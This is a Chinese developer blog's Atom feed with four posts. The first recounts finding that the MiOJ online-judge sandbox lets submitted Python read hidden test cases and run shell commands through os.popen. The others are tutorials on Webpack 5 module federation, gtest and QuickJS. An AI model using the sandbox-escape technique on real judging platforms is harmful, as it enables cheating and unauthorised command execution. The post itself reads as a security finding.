<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>VINCENT STUDIO</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://vincent0700.com/"/>
  <updated>2021-02-25T11:18:47.398Z</updated>
  <id>https://vincent0700.com/</id>
  
  <author>
    <name>Vincent</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记一次发现 MiOJ 漏洞</title>
    <link href="https://vincent0700.com/2020/11/10/068_MiOJ_hack/"/>
    <id>https://vincent0700.com/2020/11/10/068_MiOJ_hack/</id>
    <published>2020-11-10T13:00:00.000Z</published>
    <updated>2021-02-25T11:18:47.398Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1024 程序员节参加了公司的线上比赛，用的我们自己的 <a href="https://code.mi.com/site/index" target="_blank" rel="noopener">MiOJ</a>，很久没刷题了，只拿到 13/270 的名次。但是引发了我对 OJ 平台的一些认识。</p><h2 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h2><p>OJ 这一类用户拥有代码上传权限的平台应该很容易会产生上传漏洞，特别是像 Python 一类的脚本语言，很容易做到沙箱逃逸。经过一番尝试，发现的确大部分 OJ 平台都能拿到执行权限。以 MiOJ 为例：</p><img src="/2020/11/10/068_MiOJ_hack/listdir.png"><p>我们可以看到用户直接就能拉到 os 模块（我尝试过 LeetCode 也是如此），那么后面可以做的事情就多了。我发现测试用例直接在当前执行路径下的 <code>sampleIn.txt</code> 文件中，打印一下试试：</p><img src="/2020/11/10/068_MiOJ_hack/sampleIn.png"><p>再尝试执行一下 shell 指令：</p><img src="/2020/11/10/068_MiOJ_hack/popen.png"><p>再尝试写文件的时候，发现脚本执行用户的文件写入的权限被限制了：</p><img src="/2020/11/10/068_MiOJ_hack/write.png"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过测试，LeetCode 和 MiOJ 都能通过 os.popen 执行 shell，但是权限只读。我想既然 LeetCode 都这么干了，那应该也算业界公认了。不过 MiOJ 的测试用例直接就放在了容器内部，这样一来拿到测试用例的用户就能够直接通过枚举刷题，也很不公平了。</p><blockquote><p>本文内容仅供学习交流</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="Security" scheme="https://vincent0700.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>Webpack v5 模块联邦</title>
    <link href="https://vincent0700.com/2020/10/14/067_Webpack5_study/"/>
    <id>https://vincent0700.com/2020/10/14/067_Webpack5_study/</id>
    <published>2020-10-14T13:00:00.000Z</published>
    <updated>2021-02-25T11:18:47.398Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>官方文档 <a href="https://webpack.js.org/concepts/module-federation/" target="_blank" rel="noopener">传送门</a>，目前中文翻译站点还没有翻译完全。</p></blockquote><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>这里有 <code>app1</code> 和 <code>app2</code> 两个完全独立的项目，<code>app1</code> 暴露了一个模块 <code>say</code> 出去，然后 <code>app2</code> 想要去调用它。如果用一般的思维，我们会讲这个 <code>say</code> 模块抽成一个公共的包，通过 npm 去共享。但是一旦该模块更新，所有引用这个包的位置也需要 <code>npm install</code>。Webpack v5 提供了一种让代码直接在 CDN 中共享的机制，从而不再需要本地安装 npm 包、构建再发布了。我精简后的代码如下：</p><pre><code class="lang-js">// app1/webpack.config.jsmodule.exports = {  ...  plugins: [    new ModuleFederationPlugin({      name: &quot;app1&quot;,      library: { type: &quot;var&quot;, name: &quot;app1&quot; },      filename: &quot;remoteEntry.js&quot;,      exposes: {        &#39;./say&#39;: path.join(__dirname, &#39;./say.js&#39;)      }    })  ]};</code></pre><pre><code class="lang-js">// app2/webpack.config.jsmodule.exports = {  ...  plugins: [    new ModuleFederationPlugin({      name: &quot;app2&quot;,      library: { type: &quot;var&quot;, name: &quot;app2&quot; },      remotes: {        app1: &quot;app1&quot;,      }    })  ]};</code></pre><pre><code class="lang-html">&lt;!-- app2/index.html --&gt;&lt;script src=&quot;http://127.0.0.1:2001/remoteEntry.js&quot;&gt;&lt;/script&gt;</code></pre><pre><code class="lang-js">// app2/index.jsconst remoteSay = import(&#39;app1/say&#39;);remoteSay.then(({ say }) =&gt; {  say(&#39;app2&#39;)});</code></pre><p>可以看到，通过引如 <code>app1</code> 中定义的远程模块入口文件 <code>remoteEntry.js</code> 之后，我们就能够在代码中通过异步模块的方式使用了。</p><h2 id="异步模块原理"><a href="#异步模块原理" class="headerlink" title="异步模块原理"></a>异步模块原理</h2><p>我们复习下 Webpack v4 中的异步模块的原理：</p><ol><li><code>import(chunkId) =&gt; __webpack_require__.e(chunkId)</code><br>将相关的请求回调存入 <code>installedChunks</code>。<pre><code class="lang-js">// import(chunkId) =&gt; __webpack_require__.e(chunkId)__webpack_require__.e = function(chunkId) {return new Promise((resolve, reject) =&gt; { var script = document.createElement(&#39;script&#39;); script.src = jsonpScriptSrc(chunkId); var onScriptComplete = function(event) {   // ... }; var timeout = setTimeout(function() {   onScriptComplete({ type: &#39;timeout&#39;, target: script }); }, 120000); script.onerror = script.onload = onScriptComplete; document.head.appendChild(script);})}</code></pre></li><li>发起 JSONP 请求</li><li>将下载的模块录入 modules</li><li>执行 chunk 请求回调</li><li>加载 module</li><li>执行用户回调</li></ol><h2 id="模块联邦实现原理"><a href="#模块联邦实现原理" class="headerlink" title="模块联邦实现原理"></a>模块联邦实现原理</h2><p>首先看 <code>app2</code> 打包后的代码，我精简了一下，大致结构如下</p><pre><code class="lang-js">// 最外层是一个 IIFE(() =&gt; {  var __webpack_modules__ = {    &#39;webpack/container/reference/app1&#39;:      /*!***********************!*\        !*** external &quot;app1&quot; ***!        \***********************/      (module) =&gt; {        &#39;use strict&#39;;        module.exports = app1      }  };  // 定义模块缓存  var __webpack_module_cache__ = {};  // 定义 __webpack_require__  function __webpack_require__(moduleId) {    // 尝试从缓存读取模块    if (__webpack_module_cache__[moduleId]) {      return __webpack_module_cache__[moduleId].exports;    }    // 创建模块缓存    var module = (__webpack_module_cache__[moduleId] = {      exports: {}    });    // 执行模块回调，从这里可以看出，模块的回调方法存在 __webpack_modules__ 里    __webpack_modules__[moduleId](module, module.exports, __webpack_require__);    // 返回模块 exports    return module.exports;  }  // 一些 webpack runtime 方法 ...  // 底部是本地 app2 的模块代码  (() =&gt; {    /*!********************************!*\      !*** ./examples/app2/index.js ***!      \********************************/    const remoteSay = __webpack_require__.e(&quot;webpack_container_remote_app1_say&quot;).then(      __webpack_require__.t.bind(__webpack_require__, &quot;webpack/container/remote/app1/say&quot;, 7)    )    remoteSay.then(({ say }) =&gt; { say(&#39;app2&#39;)})  })();})();</code></pre><p>我们可以看到相比于 Webpack v4，打包后代码结构上的变化。首先，在最顶部会暴露依赖的远程模块的入口点，接着 <strong>webpack_require</strong> 的定义没有什么变化，再下面是一堆 runtime 方法。最底部是我们的模块代码。</p><p>我们原本的</p><pre><code class="lang-js">const remoteSay = import(&#39;app1/say&#39;);</code></pre><p>被替换成了</p><pre><code class="lang-js">const remoteSay = __webpack_require__.e(  &quot;webpack_container_remote_app1_say&quot;).then(  __webpack_require__.t.bind(    __webpack_require__,    &quot;webpack/container/remote/app1/say&quot;,    7  ))</code></pre><p>我们切到 <code>remoteSay</code> 定义的这一行断点调试，首先是 <code>__webpack_require__.e</code> 方法:</p><pre><code class="lang-js">  /* webpack/runtime/ensure chunk */  (() =&gt; {    __webpack_require__.f = {};    __webpack_require__.e = (chunkId) =&gt; {      return Promise.all(        Object.keys(__webpack_require__.f).reduce((promises, key) =&gt; {          __webpack_require__.f[key](chunkId, promises);          return promises;        }, [])      );    };  })();</code></pre><p>这里，<code>chunkId</code> 是 <code>webpack_container_remote_app1_say</code>，也就是我们在 <code>app1</code> 中暴露的远程模块。<strong>webpack_require</strong>.f 上有两个对象，remotes 和 j，定义如下：</p><pre><code class="lang-js">// 这里 f.j 方法应该只是把指定的 chunk 标记为已安装__webpack_require__.f.j = (chunkId, promises) =&gt; {  installedChunks[chunkId] = 0;};// 重点在 f.remotes 上var chunkMapping = {  webpack_container_remote_app1_say: [&#39;webpack/container/remote/app1/say&#39;]};var idToExternalAndNameMapping = {  &#39;webpack/container/remote/app1/say&#39;: [&#39;default&#39;, &#39;./say&#39;, &#39;webpack/container/reference/app1&#39;]};__webpack_require__.f.remotes = (chunkId, promises) =&gt; {  // __webpack_require__.o =&gt; hasOwnProperty   if (__webpack_require__.o(chunkMapping, chunkId)) {    chunkMapping[chunkId].forEach((id) =&gt; {      var getScope = __webpack_require__.R;      if (!getScope) getScope = [];      var data = idToExternalAndNameMapping[id];      if (getScope.indexOf(data) &gt;= 0) return;      // getScope = data = [&#39;default&#39;, &#39;./say&#39;, &#39;webpack/container/reference/app1&#39;]      getScope.push(data);      if (data.p) return promises.push(data.p);      var onError = (error) =&gt; {        if (!error) error = new Error(&#39;Container missing&#39;);        if (typeof error.message === &#39;string&#39;)          error.message += &#39;\nwhile loading &quot;&#39; + data[1] + &#39;&quot; from &#39; + data[2];        __webpack_modules__[id] = () =&gt; {          throw error;        };        data.p = 0;      };      var handleFunction = (fn, arg1, arg2, d, next, first) =&gt; {        /**         * fn: __webpack_require__         * arg1: &#39;webpack/container/reference/app1&#39;         * arg2: 0         * d: 0         * next: onExternal         * first: 1         */        try {          // __webpack_require__(&#39;webpack/container/reference/app1&#39;, 0)          // 这里会加载模块最顶部导出的从 remoteEntry 暴露出来的 app1 模块          var promise = fn(arg1, arg2);          // 由于返回的结果不是 promise，直接调到 else          if (promise &amp;&amp; promise.then) {            var p = promise.then((result) =&gt; next(result, d), onError);            if (first) promises.push((data.p = p));            else return p;          } else {            // 调用 onExternal(app1, 0, 1)            return next(promise, d, first);          }        } catch (error) {          onError(error);        }      };      var onExternal = (external, _, first) =&gt;        external          ? handleFunction(__webpack_require__.I, data[0], 0, external, onInitialized, first)          : onError();      var onInitialized = (_, external, first) =&gt;        handleFunction(external.get, data[1], getScope, 0, onFactory, first);      var onFactory = (factory) =&gt; {        data.p = 1;        __webpack_modules__[id] = (module) =&gt; {          module.exports = factory();        };      };      handleFunction(__webpack_require__, data[2], 0, 0, onExternal, 1);    });  }};</code></pre><p>第一次 <code>handleFunction</code> 会用 <strong>webpack_require</strong> 读取文件最顶部定义的 <code>app1</code> 的 chunk，这个 chunk 最终会导出 <code>app1</code> 的入口文件模块 <code>remoteEntry.js</code>。</p><p>由于 <code>remoteEntry</code> 是最先加载的，所以直接返回 <code>module</code> 本身而不是 <code>promise</code>，所以直接跳到 <code>else</code> 执行 <code>onExternal(app1, 0, 1)</code>。</p><p>第二次执行 <code>handleFunction</code>：</p><pre><code class="lang-js">var handleFunction = (fn, arg1, arg2, d, next, first) =&gt; {  // __webpack_require__.I(&#39;default&#39;, 0)  var promise = fn(arg1, arg2);  ...};</code></pre><p>这里首先调用 <strong>webpack_require</strong>.I(‘default’)，我们看下 I 方法：</p><pre><code class="lang-js">/* webpack/runtime/sharing */(() =&gt; {  __webpack_require__.S = {};  var initPromises = {};  var initTokens = {};  __webpack_require__.I = (name, initScope) =&gt; {    // 初始化 initScope 对象    if (!initScope) initScope = [];    // 解决 init 方法循环调用的问题，如果初始化过 initScope，则直接从缓存中读取    var initToken = initTokens[name];    if (!initToken) initToken = initTokens[name] = {};    if (initScope.indexOf(initToken) &gt;= 0) return;    initScope.push(initToken);    // 处理异步 init 方法    if (initPromises[name]) return initPromises[name];    // 收集 init 方法的调用依赖，挂在 __webpack_require__.S 上，如果没有则新建空对象    if (!__webpack_require__.o(__webpack_require__.S, name)) __webpack_require__.S[name] = {};    // share scope，即为，init 方法的执行环境    var scope = __webpack_require__.S[name];    var warn = (msg) =&gt; typeof console !== &#39;undefined&#39; &amp;&amp; console.warn &amp;&amp; console.warn(msg);    // 这个 uniqueName 最终作为全局变量 window[webpackChunk + uniqueName] 作为远程模块回调的缓存    var uniqueName = &#39;webpack5-demo&#39;;    var register = (name, version, factory) =&gt; {      var versions = (scope[name] = scope[name] || {});      var activeVersion = versions[version];      if (!activeVersion || (!activeVersion.loaded &amp;&amp; uniqueName &gt; activeVersion.from))        versions[version] = { get: factory, from: uniqueName };    };    // 初始化外部模块    var initExternal = (id) =&gt; {      var handleError = (err) =&gt; warn(&#39;Initialization of sharing external failed: &#39; + err);      try {        // 拿到 app1        var module = __webpack_require__(id);        if (!module) return;        // 重要！调用 app1.init 方法初始化，之前所有收集依赖的步骤都是为了给这里创造执行环境        var initFn = (module) =&gt;          module &amp;&amp; module.init &amp;&amp; module.init(__webpack_require__.S[name], initScope);        if (module.then) return promises.push(module.then(initFn, handleError));        var initResult = initFn(module);        if (initResult &amp;&amp; initResult.then) return promises.push(initResult.catch(handleError));      } catch (err) {        handleError(err);      }    };    var promises = [];    switch (name) {      case &#39;default&#39;:        {          initExternal(&#39;webpack/container/reference/app1&#39;);        }        break;    }    if (!promises.length) return (initPromises[name] = 1);    return (initPromises[name] = Promise.all(promises).then(() =&gt; (initPromises[name] = 1)));  };})();</code></pre><p>执行完毕后回来调用第三次 <code>handleFunction</code>：</p><pre><code class="lang-js">var handleFunction = (fn, arg1, arg2, d, next, first) =&gt; {  // app1.get(&#39;./say&#39;, [&#39;default&#39;, &#39;./say&#39;, &#39;webpack/container/reference/app1&#39;])  var promise = fn(arg1, arg2);  ...}</code></pre><p>跳到 <code>remoteEntry</code> 的 <code>app1.get</code> 方法：</p><pre><code class="lang-js">var moduleMap = {  &quot;./say&quot;: () =&gt; {    return __webpack_require__.e(&quot;examples_app1_say_js&quot;).then(() =&gt; () =&gt; (      __webpack_require__(&quot;./examples/app1/say.js&quot;))    );  }};var get = (module, getScope) =&gt; {  __webpack_require__.R = getScope;  getScope = (    __webpack_require__.o(moduleMap, module)      ? moduleMap[module]()      : Promise.resolve().then(() =&gt; {        throw new Error(&#39;Module &quot;&#39; + module + &#39;&quot; does not exist in container.&#39;);      })  );  __webpack_require__.R = undefined;  return getScope;};</code></pre><p>这里在 <code>moduleMap</code> 定义了 <code>./say</code> 方法所在的异步模块，然后通过 <strong>webpack_require</strong>.e 下载异步模块，加载完之后再调用 <strong>webpack_require</strong> 执行模块回调。看来下载远程模块的代码在 <code>e</code> 方法里了：</p><pre><code class="lang-js">/* webpack/runtime/ensure chunk */(() =&gt; {  __webpack_require__.f = {};  __webpack_require__.e = (chunkId) =&gt; {    return Promise.all(Object.keys(__webpack_require__.f).reduce((promises, key) =&gt; {      __webpack_require__.f[key](chunkId, promises);      return promises;    }, []));  };})();</code></pre><p>在 <strong>webpack_require</strong>.f 中只有一个 <code>j</code> 方法，跳转到 <strong>webpack_require</strong>.f.j：</p><pre><code class="lang-js">__webpack_require__.f.j = (chunkId, promises) =&gt; {  var installedChunkData = __webpack_require__.o(installedChunks, chunkId) ? installedChunks[chunkId] : undefined;  // installedChunkData 如果等于 0 表明已加载  if(installedChunkData !== 0) {    if(installedChunkData) {      promises.push(installedChunkData[2]);    } else {      if(true) { // 不太清楚这里的判断啥意思        // 初始化 Promise        var promise = new Promise((resolve, reject) =&gt; {          installedChunkData = installedChunks[chunkId] = [resolve, reject];        });        promises.push(installedChunkData[2] = promise);        // 获取 chunk 地址        var url = __webpack_require__.p + __webpack_require__.u(chunkId);        var error = new Error();        var loadingEnded = (event) =&gt; {          if(__webpack_require__.o(installedChunks, chunkId)) {            installedChunkData = installedChunks[chunkId];            if(installedChunkData !== 0) installedChunks[chunkId] = undefined;            if(installedChunkData) {              var errorType = event &amp;&amp; (event.type === &#39;load&#39; ? &#39;missing&#39; : event.type);              var realSrc = event &amp;&amp; event.target &amp;&amp; event.target.src;              error.message = &#39;Loading chunk &#39; + chunkId + &#39; failed.\n(&#39; + errorType + &#39;: &#39; + realSrc + &#39;)&#39;;              error.name = &#39;ChunkLoadError&#39;;              error.type = errorType;              error.request = realSrc;              installedChunkData[1](error);            }          }        };        // 下载 chunk 脚本        __webpack_require__.l(url, loadingEnded, &quot;chunk-&quot; + chunkId);      } else installedChunks[chunkId] = 0;    }  }};</code></pre><p>通过 <strong>webpack_require</strong>.l(url, errorHandler, chunkName) 下载脚本：</p><pre><code class="lang-js">/* webpack/runtime/load script */(() =&gt; {  var inProgress = {};  var dataWebpackPrefix = &quot;webpack5-demo:&quot;;  // loadScript function to load a script via script tag  __webpack_require__.l = (url, done, key) =&gt; {    if(inProgress[url]) { inProgress[url].push(done); return; }    var script, needAttach;    if(key !== undefined) {      var scripts = document.getElementsByTagName(&quot;script&quot;);      for(var i = 0; i &lt; scripts.length; i++) {        var s = scripts[i];        if(s.getAttribute(&quot;src&quot;) == url || s.getAttribute(&quot;data-webpack&quot;) == dataWebpackPrefix + key) { script = s; break; }      }    }    if(!script) {      needAttach = true;      // 创建 script 标签      script = document.createElement(&#39;script&#39;);      script.charset = &#39;utf-8&#39;;      script.timeout = 120;      if (__webpack_require__.nc) {        script.setAttribute(&quot;nonce&quot;, __webpack_require__.nc);      }      script.setAttribute(&quot;data-webpack&quot;, dataWebpackPrefix + key);      // 设置 src = &#39;http://127.0.0.1:2001/examples_app1_say_js.bundle.js&#39;      script.src = url;      // 到这远程脚本 examples_app1_say_js.bundle.js 应该就开始下载了    }    inProgress[url] = [done];    var onScriptComplete = (prev, event) =&gt; {      // avoid mem leaks in IE.      script.onerror = script.onload = null;      clearTimeout(timeout);      var doneFns = inProgress[url];      delete inProgress[url];      script.parentNode &amp;&amp; script.parentNode.removeChild(script);      doneFns &amp;&amp; doneFns.forEach((fn) =&gt; fn(event));      if(prev) return prev(event);    }    ;    var timeout = setTimeout(onScriptComplete.bind(null, undefined, { type: &#39;timeout&#39;, target: script }), 120000);    script.onerror = onScriptComplete.bind(null, script.onerror);    script.onload = onScriptComplete.bind(null, script.onload);    needAttach &amp;&amp; document.head.appendChild(script);  };})();</code></pre><p>到此，远程模块已加载完成，后面的事情就与 Webpack v4 一样了。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>下面总结下远程模块的加载步骤：</p><ol><li>下载并执行 <code>remoteEntry.js</code>，挂载入口点对象到 <code>window.app1</code>，他有两个函数属性，<code>init</code> 和 <code>get</code>。<code>init</code> 方法用于初始化作用域对象 initScope，<code>get</code> 方法用于下载 <code>moduleMap</code> 中导出的远程模块。</li><li>加载 <code>app1</code> 到本地模块</li><li>创建 <code>app1.init</code> 的执行环境，收集依赖到共享作用域对象 <code>shareScope</code></li><li>执行 <code>app1.init</code>，初始化 <code>initScope</code></li><li>用户 <code>import</code> 远程模块时调用 <code>app1.get(moduleName)</code> 通过 <code>Jsonp</code> 懒加载远程模块，然后缓存在全局对象 window[‘webpackChunk’ + appName]</li><li>通过 <strong>webpack_require</strong> 读取缓存中的模块，执行用户回调</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincent0700.com/tags/FrontEnd/"/>
    
      <category term="Webpack" scheme="https://vincent0700.com/tags/Webpack/"/>
    
  </entry>
  
  <entry>
    <title>使用 gtest 对 C++ 项目进行单元测试</title>
    <link href="https://vincent0700.com/2020/08/31/066_GTest_tutorial/"/>
    <id>https://vincent0700.com/2020/08/31/066_GTest_tutorial/</id>
    <published>2020-08-31T13:00:00.000Z</published>
    <updated>2021-02-25T11:18:47.398Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>gtest 是谷歌的 C++ 单元测试框架，<a href="https://github.com/google/googletest.git" target="_blank" rel="noopener">仓库链接</a></p></blockquote><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><pre><code class="lang-bash">$ git clone https://github.com/google/googletest.git$ cd googletest$ mkdir build &amp;&amp; cd ./build$ cmake .. &amp;&amp; make -j4</code></pre><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><p>下面测试这样一段代码</p><pre><code class="lang-c++">// add.hint add(int a, int b) {  return a + b;}</code></pre><p>编写测试用例</p><pre><code class="lang-c++">// test.cc#include &lt;gtest/gtest.h&gt;#include &quot;add.h&quot;TEST(TEST_ADD, demo1) {    EXPECT_TRUE(add(1, 2) == 3);    EXPECT_TRUE(add(2, 3) == 5);}TEST(TEST_ADD, demo2) {    EXPECT_TRUE(add(1, 2) == 3);    EXPECT_TRUE(add(2, 3) == 6);}int main(int argc, char* argv[]) {    testing::InitGoogleTest(&amp;argc, argv);    return RUN_ALL_TESTS();}</code></pre><p>执行</p><pre><code class="lang-bash">$ clang++ -I/path/to/googletest/include test.cc -o unit_test -L/path/to/googletest/build/lib -lgtest -lgtest_main -lpthread -std=c++11 &amp;&amp; ./unit_test&#39;&#39;&#39;[==========] Running 2 tests from 1 test suite.[----------] Global test environment set-up.[----------] 2 tests from TEST_ADD[ RUN      ] TEST_ADD.demo1[       OK ] TEST_ADD.demo1 (0 ms)[ RUN      ] TEST_ADD.demo2test.cc:11: FailureValue of: add(2, 3) == 6  Actual: falseExpected: true[  FAILED  ] TEST_ADD.demo2 (0 ms)[----------] 2 tests from TEST_ADD (0 ms total)[----------] Global test environment tear-down[==========] 2 tests from 1 test suite ran. (0 ms total)[  PASSED  ] 1 test.[  FAILED  ] 1 test, listed below:[  FAILED  ] TEST_ADD.demo2</code></pre><p>发现 TEST_ADD.demo2 这个用例出错了，因为 2 + 3 != 6，符合预期。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="C++" scheme="https://vincent0700.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Fabrice 又一新作 QuickJs</title>
    <link href="https://vincent0700.com/2020/08/11/065_QuickJs/"/>
    <id>https://vincent0700.com/2020/08/11/065_QuickJs/</id>
    <published>2020-08-11T13:00:00.000Z</published>
    <updated>2021-02-25T11:18:47.396Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="作者简介"><a href="#作者简介" class="headerlink" title="作者简介"></a>作者简介</h2><p>Fabrice Bellard 是个神一般的程序员，这是他的个人主页 <a href="https://bellard.org/" target="_blank" rel="noopener">https://bellard.org/</a> ,里面的每一个作品都惊为天人而且对计算机科学领域具有深远影响，以下是他的生平：</p><blockquote><ul><li>1972年生于法国格勒诺布尔（Grenoble）。在高中就读期间开发了著名的可执行压缩程序LZEXE，这是当年DOS上第一个广泛使用的文件压缩程序。大学就读于巴黎综合理工学院，后在巴黎高等电信学校攻读。</li><li>1996年，他编写了一个简洁但是完整的C编译器和一个Java虚拟机Harissa。Fabrice Bellard发明的TinyCC是GNU/Linux环境下最小的ANSI C语言编译器，是目前号称编译速度最快的C编译器。</li><li>1997年他提出了最快速的计算圆周率的算法，是贝利－波尔温－普劳夫公式的变体。在计算圆周率的过程中，Fabrice Bellard使用改良后的查德诺夫斯基方程算法来进行圆周率的计算，并使用贝利－波尔温－普劳夫公式来验证计算的结果。为了纪念他对圆周率算法所作出的杰出贡献，Fabrice Bellard所使用的改良型算法被命名为Fabrice Bellard算法，这种算法是目前所有圆周率算法中最快的一种，这个计算N位PI的公式比传统的BBQ算法要快47%。</li><li>1998年编写了一个简洁的OpenGL实现TinyGL。</li><li>2000年，他化名Gérard Lantau，创建了FFmpeg项目。FFmpeg单词中的FF指的是Fast Forward，FFmpeg这个2000年发起著名的开源多媒体播放器项目，是MPlayer的姊妹项目。这是一个如此重要的成就。这个多平台、多功能的多媒体编码解码器由Fabrice Bellard发起并管理，现在是由Michael Niedermayer在进行维护。</li><li>2003年，开发了Emacs克隆QEmacs。</li><li>2004年，他编写了一个只有138KB的启动加载程序TCCBOOT，可以在15秒内从源代码编译并启动Linux系统。</li><li>2005年，用普通PC和VGA卡设计了一个数字电视系统。</li><li>2009年12月31日，他声称打破了圆周率计算的世界纪录，算出小数点后2.7万亿位，仅用一台普通个人电脑。他使用的个人PC价格不到2000欧元，仅用了116天，就计算出了PI的小数点后第2.7万亿位，超过了由目前排名世界第47位的T2K Open超级计算机于2009年8月17日创造的世界纪录。新纪录比原纪录多出1200亿位，然而，他使用的这台桌面电脑的配置仅为：2.93GHz Core i7 CPU，6GB内存，7.5TB硬盘。</li><li>2011年，他使用JavaScript写了一个PC虚拟机Jslinux。这个虚拟机仿真了一个32位的x86兼容处理器，一个8259可编程中断控制器，一个8254可编程中断计时器，和一个16450 UART。</li><li>2012年，在PC上用软件实现4G LTE基站。</li></ul></blockquote><h2 id="QuickJs"><a href="#QuickJs" class="headerlink" title="QuickJs"></a>QuickJs</h2><p>最近，这位大佬的新作品 <code>QuickJs</code> 又火了，这个用 C89 写的只有几万行代码的 JS 引擎，居然通过了 <a href="https://test262.report/" target="_blank" rel="noopener">Test262</a> 96% 的测试，仅次于 V8 的 97%，ChakraCore (Edge) 只有 65%。新特性的通过率高达 89%， 仅次于 V8 的 90%，ChakraCore (又躺枪) 只有 16%。</p><img src="/2020/08/11/065_QuickJs/test262.png"><p>QuickJs Runtime 使用的是 <a href="https://www.iteye.com/blog/rednaxelafx-492667" target="_blank" rel="noopener">栈虚拟机</a>，内部采用引用计数的方式实现 gc。</p><h3 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h3><ol><li><p>去大佬的主页下载压缩包（大佬的页面就是这么朴实无华且枯燥）<br><a href="https://bellard.org/quickjs/" target="_blank" rel="noopener">https://bellard.org/quickjs/</a></p></li><li><p>根目录下有 Makefile，直接 make 编译即可</p></li><li><p>编译完生成了一个 <code>qjs</code>，一个 <code>qjsc</code>，中文说明可以参考这篇文档<br><a href="https://github.com/quickjs-zh/QuickJS/blob/master/README.md" target="_blank" rel="noopener">https://github.com/quickjs-zh/QuickJS/blob/master/README.md</a></p></li></ol><h3 id="qjs"><a href="#qjs" class="headerlink" title="qjs"></a>qjs</h3><p>qjs 本身可以直接执行 Javscript 代码：</p><pre><code class="lang-bash">$ ./qjs test.js</code></pre><p>也可以像 d8、node 那样运行 REPL：</p><pre><code class="lang-bash">$ ./qjsQuickJS - Type &quot;\h&quot; for helpqjs &gt; const a = 5;undefinedqjs &gt; a++;TypeError: &#39;a&#39; is read-only    at &lt;eval&gt; (&lt;evalScript&gt;)</code></pre><h3 id="qjsc"><a href="#qjsc" class="headerlink" title="qjsc"></a>qjsc</h3><p>qjsc 可以把 JavaScript 编译成字节码，然后输出成 C 文件，像这样：</p><pre><code class="lang-bash">./qjsc -e -o hello.cc examples/hello.js</code></pre><pre><code class="lang-c">/* File generated automatically by the QuickJS compiler. */#include &quot;quickjs-libc.h&quot;const uint32_t qjsc_hello_size = 87;const uint8_t qjsc_hello[87] = { 0x02, 0x04, 0x0e, 0x63, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65, 0x06, 0x6c, 0x6f, 0x67, 0x16, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x22, 0x65, 0x78, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x73, 0x2f, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x2e, 0x6a, 0x73, 0x0e, 0x00, 0x06, 0x00, 0xa0, 0x01, 0x00, 0x01, 0x00, 0x03, 0x00, 0x00, 0x14, 0x01, 0xa2, 0x01, 0x00, 0x00, 0x00, 0x38, 0xe0, 0x00, 0x00, 0x00, 0x42, 0xe1, 0x00, 0x00, 0x00, 0x04, 0xe2, 0x00, 0x00, 0x00, 0x24, 0x01, 0x00, 0xce, 0x28, 0xc6, 0x03, 0x01, 0x00,};int main(int argc, char **argv){  JSRuntime *rt;  JSContext *ctx;  rt = JS_NewRuntime();  js_std_init_handlers(rt);  ctx = JS_NewContextRaw(rt);  JS_AddIntrinsicBaseObjects(ctx);  js_std_add_helpers(ctx, argc, argv);  js_std_eval_binary(ctx, qjsc_hello, qjsc_hello_size, 0);  js_std_loop(ctx);  JS_FreeContext(ctx);  JS_FreeRuntime(rt);  return 0;}</code></pre><p>或者直接编译成一个可执行文件：</p><pre><code class="lang-bash">$ ./qjsc -o hello  examples/hello.js</code></pre><p>详细参数参考这篇 <a href="https://github.com/quickjs-zh/QuickJS#421-qjsc-%E7%BC%96%E8%AF%91%E5%99%A8" target="_blank" rel="noopener">中文文档</a></p>]]></content>
    
    <summary type="html">
    
      
      
